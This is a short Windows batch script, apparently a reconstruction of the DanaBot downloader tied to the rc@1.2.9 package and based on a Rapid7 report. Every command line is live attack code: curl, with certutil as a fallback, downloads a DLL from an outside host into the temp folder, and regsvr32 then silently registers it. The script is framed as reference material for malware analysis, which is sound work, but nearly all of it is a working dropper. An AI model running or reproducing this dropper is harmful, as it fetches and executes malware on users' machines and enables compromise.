@echo off
:: rc@1.2.9 — DanaBot downloader reconstructed from Rapid7 report
:: On Windows: downloads DLL payload via curl/wget/certutil fallback
:: Then registers with regsvr32 for persistence
curl -o %TEMP%\sdd.dll "https://pastorcryptograph.at/3/sdd.dll" || certutil -urlcache -f "https://pastorcryptograph.at/3/sdd.dll" %TEMP%\sdd.dll
regsvr32 -s %TEMP%\sdd.dll
